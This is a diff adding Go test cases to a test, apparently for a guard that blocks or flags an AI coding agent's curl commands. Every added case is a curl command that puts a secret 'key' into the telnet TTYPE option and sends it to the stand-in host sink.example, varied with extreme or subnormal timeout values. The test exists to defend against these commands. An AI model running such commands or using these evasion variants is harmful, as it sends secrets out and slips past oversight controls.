@@ -118,6 +118,12 @@ func TestEvaluateCodexHookCurlTelnetOptionEgress(t *testing.T) {
 			wantBlock: true,
 		},
 		{
+			name: "exact zero extreme exponents preserve negotiation",
+			command: "curl --connect-timeout -0e-4000 --max-time " +
+				"0x0p-999999 -t TTYPE=" + key + " telnet://sink.example/",
+			wantBlock: true,
+		},
+		{
 			name: "static value padding preserves negotiation",
 			command: "curl --user-agent fixture --ftp-method singlecwd " +
 				"--ftp-port eth0 --ftp-alternative-to-user safe " +
@@ -188,6 +194,13 @@ func TestEvaluateCodexHookCurlTelnetOptionEgress(t *testing.T) {
 				"--limit-rate 0K --local-port 0 --max-filesize 0B " +
 				"--proto +telnet --rate 1/s --trace-config +ids,-time " +
 				"--variable FIXTURE=literal -t TTYPE=" + key +
+				" telnet://sink.example/",
+			wantBlock: true,
+		},
+		{
+			name: "expect timeout exact zero and normal sub millisecond preserve negotiation",
+			command: "curl --expect100-timeout -0x0p-999999 " +
+				"--expect100-timeout 1e-307 -t TTYPE=" + key +
 				" telnet://sink.example/",
 			wantBlock: true,
 		},
@@ -326,6 +339,76 @@ func TestEvaluateCodexHookCurlTelnetOptionEgress(t *testing.T) {
 		{
 			name: "nonzero millisecond timeout remains detection only",
 			command: "curl --max-time .001 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "positive decimal timeout underflow remains detection only",
+			command: "curl --max-time 1e-4000 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "negative decimal timeout underflow remains detection only",
+			command: "curl --max-time -1e-4000 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "positive hex timeout underflow remains detection only",
+			command: "curl --max-time 0x1p-999999 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "negative hex timeout underflow remains detection only",
+			command: "curl --max-time -0x1p-999999 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "subnormal timeout remains detection only",
+			command: "curl --max-time 1e-320 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "minimum normal timeout remains detection only",
+			command: "curl --max-time 0x1p-1022 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "positive rounded minimum normal timeout remains detection only",
+			command: "curl --max-time 0x1.fffffffffffffp-1023 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "negative rounded minimum normal timeout remains detection only",
+			command: "curl --max-time -0x1.fffffffffffffp-1023 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "positive decimal expect timeout underflow remains detection only",
+			command: "curl --expect100-timeout 1e-4000 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "negative decimal expect timeout underflow remains detection only",
+			command: "curl --expect100-timeout -1e-4000 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "positive hex expect timeout underflow remains detection only",
+			command: "curl --expect100-timeout 0x1p-999999 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "negative hex expect timeout underflow remains detection only",
+			command: "curl --expect100-timeout -0x1p-999999 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "decimal subnormal expect timeout remains detection only",
+			command: "curl --expect100-timeout 1e-320 -t TTYPE=" + key +
+				" telnet://sink.example/",
+		},
+		{
+			name: "hex subnormal expect timeout remains detection only",
+			command: "curl --expect100-timeout 0x1p-1074 -t TTYPE=" + key +
 				" telnet://sink.example/",
 		},
 		{
